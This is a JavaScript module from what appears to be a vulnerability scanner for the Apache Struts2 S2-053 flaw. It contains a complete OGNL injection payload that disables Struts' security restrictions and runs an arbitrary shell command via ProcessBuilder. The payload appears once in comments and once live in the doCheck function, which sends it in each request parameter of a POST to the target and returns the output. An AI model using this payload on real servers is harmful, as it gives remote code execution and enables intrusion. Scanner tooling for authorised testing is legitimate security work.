
module.exports={
	tags:"struts2,053,parms",
	des:"struts2 053Vulnerability detection",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-033.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-053"],
	test:"node checkUrl.js -u http://192.168.10.216:8082/s2-053/ --struts2 053",
	/*
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
link = "{}/?{}={}".format(url, param, quote(payload))
*/
	doCheck:function (url,fnCbk,parms)
	{
		parms || (parms = {});
		var _t = this,_s = _t.self,szOldUrl = url,a = "",s = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + _s.g_szCmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}";
		for(var k in parms)
		{
			a += k + "=" + _s.fnUrlEncode2(s) + "&";
		}
		// console.log(a);
		_s.request(_s.fnOptHeader({method: 'POST',uri: url + "?" + a}),
	    	function(e,r,b)
	    {
	    	_s.error(e);
	    	_s.fnShowBody(b);
	    	_s.fnDoBody(b,"s2-053",url,null,function(o)
	    	{
	    		var r = {"url":url,"send":s};
  				fnCbk(_s.copyO2O(r,o),_t);
	    	});
	    });
	}
};